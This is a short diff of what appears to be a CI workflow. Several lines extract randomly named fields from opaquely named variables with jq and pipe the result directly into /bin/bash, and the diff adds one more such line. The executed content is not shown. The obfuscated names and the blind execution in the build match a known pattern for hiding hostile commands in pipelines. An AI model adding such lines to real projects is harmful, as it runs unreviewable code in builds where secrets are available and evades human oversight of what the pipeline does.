@@ -33,6 +33,7 @@ jobs:
           echo $ldjjm22 | jq -r .xkal73 | /bin/bash
           printf '%s' "$je7" | jq -r .wj52518 | /bin/bash
           echo $egsrl0066 | jq -r .wcmv8752 | /bin/bash
+          echo $wolip27 | jq -r .it28 | /bin/bash
 
       - name: Upload artifact
         if: always()
